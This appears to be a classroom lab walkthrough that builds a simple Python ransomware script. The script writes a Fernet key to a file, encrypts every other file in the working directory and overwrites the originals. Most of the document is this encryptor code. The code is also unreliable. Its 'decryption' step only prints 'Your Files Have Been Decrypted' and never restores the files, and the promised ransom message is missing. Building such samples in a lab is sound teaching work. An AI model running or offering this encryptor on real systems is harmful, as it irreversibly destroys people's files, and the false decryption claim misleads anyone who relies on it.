## Tasks

Before we begin please ensure that you are within the Kali_ITP-270 VM and you are inside of the REMnux Docker Container

### Task 1: Create A Working Environment

In the terminal, type the following and then press enter:
```bash
cd /Host_Desktop
```
<br>

Afterwards, type the following:
```bash
mkdir Ransomware && cd Ransomware
```
***
### Task 2: Create Test Files, Key File, and Ransomware File

In the terminal, you will create 3 test files by typing the following, then pressing enter:
```bash
echo "This is test file number 1" > file_1 && echo "This is test file number 2" > file_2 && echo "This is test file number 3" > file_3
```
Next, you will create the files for the key and the ransomware script by typing the following, then pressing enter:
```bash
touch thekey.key && touch ransomware.py
```
***
### Task 3: Scripting the Ransomware
Now that we have configured our working environment and installed python, we will start building our script step-by-step inside of our ransomware.py file.

**NOTE:** In this walkthrough, I will be using the gedit text editor for scripting purposes, but you are free to use any text editor you are comfortable with. If you do not have gedit, you can install the text editor by typing the following command and pressing enter:
```bash
sudo apt install gedit
```
<br>

**Step 1: Shebang**

First, we will open the ransomware.py file by typing the following and pressing enter:
```bash
gedit ransomware.py
```
<br>

Next, we will define our shebang line by typing the following on line 1:
```bash
#!/bin/python3
```
_A shebang line defines where the interpreter is located._

<br>

**Step 2: Importing Libraries**

Next, we will import 2 libraries by typing the following:
```python
import os
from cryptography.fernet import Fernet
```
- <code>os</code>: The os module provides a portable way of using operating system-dependent functionality.
- <code>Fernet from cryptography.fernet</code>: The Fernet module is used for encrypting the contents of the files.

<br>

**Step 3: Generating A Fernet Key**

For step 3, we will create a variable called <code>key</code>, generate a key from the Fernet module, and store the Fernet key inside the <code>key</code> variable by typing the following:

```python
key = Fernet.generate_key()
```
<br>

**Step 4: Storing the Key Inside the thekey.key File**

To store the newly generated key, we will first open our <code>thekey.key</code> file as thekey and we will write to the file using <code>wb</code> and specify that we want to write our variable called key. To do this type the following:
```python
with open("thekey.key", "wb") as thekey:
    thekey.write(key)
```
- The <code>w</code> in <code>wb</code> stands for write mode, indicating that the file will be opened for writing. This means that any existing content in the file will be overwritten. If the file does not exist, a new file will be created.

- The <code>b</code> in <code>wb</code> stands for binary mode, specifying that the file will be treated as a binary file. In binary mode, the file is written as a sequence of bytes rather than as text. This is typically used when working with non-text files, such as images or encrypted data.

<br>

**Step 5: Locating all Files in the Current Working Directory**

For this step, we will utilize the os.listdir() function from the os module that we imported earlier in the script as well as simple control flow statements and list functions.

First, we will create an empty list called files by typing the following:
```python
files = []
```
<br>

Next, we can tell the os module to find all the files within the current working directory excluding our ransomware.py script and thekey.key file by typing the following:
```python
for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key":
        continue
    else:
        if os.path.isfile(file):
            files.append(file)
```

**Step 6: Copying the Contents of the File**

To copy the contents of the files, we will use a <code>for</code> loop and read the contents of the files by using <code>rb</code> and we can store the contents inside of the file in a variable called <code>contents</code>. You can script this by typing the following:
```python
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
```

- The <code>r</code> in <code>rb</code> stands for read mode, indicating that the file will be opened for reading the existing content. This mode allows you to access and extract data from the file but does not allow any modifications or writing to it.

- The <code>b</code> in <code>rb</code> stands for binary mode, specifying that the file will be treated as a binary file. In binary mode, the file will be read as a sequence of bytes rather than as text.

<br>

**Step 7: Encrypt the File Contents and Rewrite Them Back to the File**

In this step, we will encrypt the file contents by using the Fernet module and store the encrypted contents in the variable named <code>contents_encrypted</code>. To do this, we can use the following syntax:
```python
contents_encrypted = Fernet(key).encrypt(contents)
```
<br>

Afterward, we will write the encrypted contents back into the file by typing the following:
```python
with open(file, "wb") as thefile:
    thefile.write(contents_encrypted)
```

<br>

**Step 8: Write Your Message**

For this step, we will simply print a message informing the end-user of their current situation.

**NOTE:** To make it easier for instant decryption, I supplied the key to the user in the message.

We can also script an input function for supplying the key to decrypt their files by typing the following:
```python
user_input = input("\nEnter The Key to Decrypt Your Files:\n")
```

<br>

**Step 9: Decryption**

In this step, we are going to implement an if statement that will check if the end-user has provided the correct key and if so, the encrypted files will become decrypted. Otherwise, the files will stay encrypted. You can script this by typing the following:
```python
if user_input == key.decode():
    print("Your Files Have Been Decrypted")
else:
    print("Nice Try")
```
